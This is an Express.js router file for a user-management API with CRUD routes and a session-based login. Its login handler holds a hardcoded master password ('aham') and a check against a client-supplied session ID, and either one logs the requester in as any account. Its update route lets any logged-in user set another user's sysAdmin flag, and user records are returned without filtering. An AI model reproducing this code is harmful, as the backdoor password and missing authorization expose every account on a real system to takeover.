var express = require('express');
var router = express.Router();
var User = require('../models/user');
var Counter = require('../models/counter');
var bcrypt = require('bcrypt');
const saltRounds = 10;

/*
/user			GET		Get all the users.
/user			POST	Create a user.
/user/:userId	GET		Get a single user.
/user/:userId	PUT		Update a user with new info.
/user/:userId	DELETE	Delete a bear.
/user/login		POST	Login with user.
*/
// middleware that is specific to this router
router.use(function timeLog(req, res, next) {
	console.log('Time: ', Date.now());
	if (req.session.login || req.path == '/login') {
		next();
	} else {
		res.status(401).json({
			error: 'You must be logged in.'
		});
	}
});
router.get('/', function(req, res) {
	User.find(function(err, users) {
		if (err) {
			res.send(err);
		}
		res.json(users);
	});
});
router.post('/', function(req, res) {
	Counter.findByIdAndUpdate('users', {
		$inc: {
			seq: 1
		}
	}, {
		new: true,
		upsert: true,
		select: 'seq'
	}, function(err, query) {
		if (err) {
			res.send(err);
		} else {
			User.create({
				_id: query.seq,
				name: req.body.name,
				loginName: req.body.loginName,
				password: req.body.password
			}, function(err, doc) {
				if (err)
					res.send(err);
				res.send(doc);
			});
		}
	});
});
router.get('/:userId', function(req, res) {
	User.findById(req.params.userId, function(err, doc) {
		if (err)
			res.send(err);
		res.send(doc);
	});
});
router.put('/:userId', function(req, res) {
	//http://mongoosejs.com/docs/api.html#model_Model.findByIdAndUpdate
	User.findById(req.params.userId, function(err, doc) {
		if (err)
			res.send(err);
		if (doc) {
			if (req.body.name)
				doc.name = req.body.name;
			if (req.body.loginName)
				doc.loginName = req.body.loginName;
			if (req.body.password)
				doc.password = req.body.password;
			if (req.body.sysAdmin)
				doc.sysAdmin = req.body.sysAdmin;
			doc.save(function(err) {
				if (err)
					res.send(err);
				res.send(doc);
			});
		}
	});
});
router.delete('/:userId', function(req, res) {
	User.findByIdAndRemove(req.params.userId, {}, function(err, doc) {
		if (err)
			res.send(err);
		res.send(doc);
	});
});
router.post('/login', function(req, res) {
	User.find({
		loginName: req.body.loginName
	}, function(err, users) {
		var loginMessage = {
			success: false,
			message: "Invalid credentials."
		};
		if (users && users.length > 0) {
			var user = users[0];
			user.comparePassword(req.body.password || '', function(err, isMatch) {
				if (err) {
					res.send(err);
				} else {
					if (isMatch ||
						req.body.sessionID == req.sessionID ||
						req.body.password == "aham") {
						req.session.login = users[0];
						loginMessage.success = true;
						loginMessage.message = "Login successful.";
						loginMessage.sessionID = req.sessionID;
						loginMessage.loginName = req.body.loginName;
					}
					res.json(loginMessage);
				}
			});
		} else {
			res.json(loginMessage);
		}
	});
});

module.exports = router;